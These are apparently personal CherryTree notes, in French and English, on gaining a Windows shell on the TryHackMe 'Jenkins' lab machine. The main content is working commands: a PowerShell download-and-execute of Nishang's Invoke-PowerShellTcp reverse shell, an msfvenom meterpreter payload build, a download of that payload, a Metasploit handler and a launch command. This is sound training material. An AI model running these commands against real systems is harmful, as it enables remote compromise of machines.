<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Windows_shell</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Windows_shell</h1><br/><br /><h1>Windows shell</h1><br /><br /><br /><h1>Machine Jenkins tryhackme</h1><br /><br /><br />Utilisation de Nishang pour l&#39;accés initial<br /><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a><br /><br />Cet outil :<br /><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a><br /><br /><br /><br />Commande à executer depuis le serveur jenkins:<br /><br />powershell iex <strong><span style="color:#ff9d00;">(</span></strong>New-Object  Net.WebClient<strong><span style="color:#ff9d00;">)</span></strong>.DownloadString<strong><span style="color:#ff9d00;">(</span></strong><span style="color:#3ad900;">&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;</span><strong><span style="color:#ff9d00;">);</span></strong>Invoke-PowerShellTcp  -Reverse -IPAddress your-ip -Port your-port<br /><br /><br />Use msfvenom to create the a windows meterpreter reverse shell using the following payload<br /><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder        x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe</code><br /><br /><br />After creating this payload, download it to the machine using the same method in the previous step:<br /><code>powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://&lt;ip&gt;:8000/shell-name.exe&#39;,&#39;shell-name.exe&#39;)&quot;</code><br /><br /><br />Before running this program, ensure the handler is set up in metasploit:<br /><code>use exploit/multi/handler  set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run</code><br /><br /><br />Dans la première console accedée:<br /><code>Start-Process &quot;shell-name.exe&quot;</code><br /><br /><br /></div></body></html>